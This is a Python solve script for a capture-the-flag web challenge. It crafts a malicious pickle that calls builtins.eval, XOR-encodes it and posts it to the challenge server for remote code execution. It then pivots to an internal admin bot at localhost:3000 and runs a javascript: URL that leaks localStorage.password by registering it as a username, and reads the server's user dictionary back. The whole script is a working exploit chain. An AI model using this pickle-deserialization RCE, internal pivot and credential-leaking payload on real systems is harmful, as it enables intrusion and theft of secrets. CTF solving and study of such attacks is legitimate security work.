#!/usr/bin/env python3
import argparse
import base64
import pickle
import re
import ssl
import sys
import urllib.error
import urllib.request

TARGET = "https://butter-basted-fish-fingers-on-compressed-truffle-oil-pfl9.gpn24.ctf.kitctf.de"
PREFIX = bytes.fromhex("8004 950000000000000000 7d 94 28")
KEY = bytes.fromhex("77c07f8fd2ae7ad9f5aabc008c79d0d3")
FLAG_RE = re.compile(r"GPNCTF\{[^}\r\n]+\}")


def xor_repeating(data: bytes, key: bytes = KEY) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def pstr(s: str) -> bytes:
    b = s.encode()
    if len(b) < 256:
        return b"\x8c" + bytes([len(b)]) + b
    return b"X" + len(b).to_bytes(4, "little") + b


def secretpickle_encode_suffix(suffix: bytes) -> str:
    return base64.b64encode(xor_repeating(suffix)).decode()


def secretpickle_decode_response(encoded: str):
    raw = PREFIX + xor_repeating(base64.b64decode(encoded))
    return pickle.loads(raw)


def build_eval_payload(py_expr: str) -> str:
    suffix = b"".join([
        pstr("action"), pstr("hello"),
        pstr("params"), b"}", b"(", pstr("name"),
        pstr("builtins"), pstr("eval"), b"\x93",
        pstr(py_expr), b"\x85", b"R",
        b"u", b"u", b".",
    ])
    return secretpickle_encode_suffix(suffix)


def post_payload(base_url: str, payload: str, timeout: int = 40, insecure: bool = False):
    url = base_url.rstrip("/") + "/" + payload
    req = urllib.request.Request(url, data=b"", method="POST")
    ctx = None
    if insecure and url.startswith("https://"):
        ctx = ssl._create_unverified_context()
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        body = r.read().decode(errors="replace")
        status = getattr(r, "status", None)
    return status, body


def run_eval(base_url: str, py_expr: str, timeout: int = 40, insecure: bool = False):
    payload = build_eval_payload(py_expr)
    status, encoded_body = post_payload(base_url, payload, timeout=timeout, insecure=insecure)
    decoded = secretpickle_decode_response(encoded_body)
    result = decoded.get("result", "") if isinstance(decoded, dict) else decoded
    if isinstance(result, str) and result.startswith("Hello, "):
        output = result[len("Hello, "):]
        if output.endswith("!"):
            output = output[:-1]
    else:
        output = result
    return {"status": status, "decoded": decoded, "output": output, "payload": payload}


def make_adminbot_trigger_expr(js_url: str) -> str:
    # Run from the vulnerable server process. This reaches the internal adminbot
    # on localhost:3000, waits for it to finish the visit, and returns a marker.
    return (
        "(__import__('urllib.request').request.urlopen("
        "'http://localhost:3000/visit?url='+"
        f"__import__('urllib.parse').parse.quote({js_url!r}, safe=''),"
        "timeout=60).read(), 'ADMINBOT_DONE')[1]"
    )


def dump_users_expr() -> str:
    return (
        "next((repr(m.USERS) for m in __import__('sys').modules.values() "
        "if hasattr(m,'USERS') and hasattr(m,'action_handler')), 'NO_USERS')"
    )


def rce_check_expr() -> str:
    return "'RCE_OK'"


def main():
    ap = argparse.ArgumentParser(description="Remote solve for secretpickle-easy via server RCE -> adminbot pivot")
    ap.add_argument("base_url", nargs="?", default=TARGET)
    ap.add_argument("--timeout", type=int, default=40)
    ap.add_argument("--insecure", action="store_true")
    args = ap.parse_args()

    base = args.base_url.rstrip('/')
    print(f"[+] target: {base}")

    # Step 1: verify code execution.
    print("\n[1] verifying Python eval RCE")
    res = run_eval(base, rce_check_expr(), timeout=args.timeout, insecure=args.insecure)
    print(f"[+] HTTP status: {res['status']}")
    print(f"[+] output: {res['output']}")
    if "RCE_OK" not in str(res["output"]):
        print("[-] RCE check failed")
        return 1

    # Step 2: pivot into the internal adminbot. We make it navigate with a
    # javascript: URL in the context of the already logged-in admin page.
    # The script registers a *new* user whose username is localStorage.password,
    # i.e. the flag used by the adminbot for the admin login.
    js_variants = [
        "javascript:location='/?action=register&params.username='+encodeURIComponent(localStorage.password)+'&params.password=x'",
        "javascript:location=location.origin+'/?action=register&params.username='+encodeURIComponent(localStorage.password)+'&params.password=x'",
    ]

    trigger_ok = False
    for i, js in enumerate(js_variants, 1):
        print(f"\n[2.{i}] triggering adminbot with JS URL")
        try:
            res = run_eval(base, make_adminbot_trigger_expr(js), timeout=max(args.timeout, 70), insecure=args.insecure)
            print(f"[+] HTTP status: {res['status']}")
            print(f"[+] output: {res['output']}")
            if "ADMINBOT_DONE" in str(res["output"]):
                trigger_ok = True
                break
        except Exception as e:
            print(f"[-] trigger failed: {type(e).__name__}: {e}")

    if not trigger_ok:
        print("[-] could not complete adminbot trigger")
        return 1

    # Step 3: read back the live USERS dict from the vulnerable server process.
    # If the pivot worked, one username should now literally be the flag.
    print("\n[3] dumping live USERS dict from server process")
    res = run_eval(base, dump_users_expr(), timeout=args.timeout, insecure=args.insecure)
    print(f"[+] HTTP status: {res['status']}")
    print(f"[+] decoded response: {res['decoded']!r}")
    print(f"[+] USERS dump: {res['output']}")

    m = FLAG_RE.search(str(res["output"]))
    if not m:
        print("\n[-] no flag found in USERS dump")
        return 1

    flag = m.group(0)
    print(f"\n[+] FLAG FOUND: {flag}")
    print("[+] proof: the adminbot used localStorage.password to register a new username, and that username now appears in the server's live USERS dict")
    return 0


if __name__ == "__main__":
    sys.exit(main())
